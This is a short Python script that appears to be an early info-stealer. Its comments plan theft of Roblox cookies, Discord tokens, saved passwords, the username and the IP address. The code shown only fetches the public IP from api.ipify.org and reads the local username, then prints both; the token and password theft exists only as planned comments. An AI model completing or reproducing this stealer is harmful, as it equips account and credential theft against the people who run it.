#THIS IS A PRODUCTION SCRIPT DO NOT USE YET!
#def roblox: try to get roblox cookie then get info from it
#def pcinfo: try to get pc username
#def ip: try to get ip
#def discord: try to get discord tokens
#def passwords: try to get passwords
import requests, json, getpass
def ip():
    try:
        ip = requests.get('http://api.ipify.org/', timeout=3)
        ip = ip.text
        data['ip'] = ip
    except:
        data['ip'] = 'na'
        pass        

def pcinfo():
    try:
        data['pcinfo'] = getpass.getuser()
    except:
        pass

if __name__ == "__main__":
    global data
    data = {
        "ip": "",
        "pcinfo": ""
    }
    ip()
    pcinfo()
    print(data)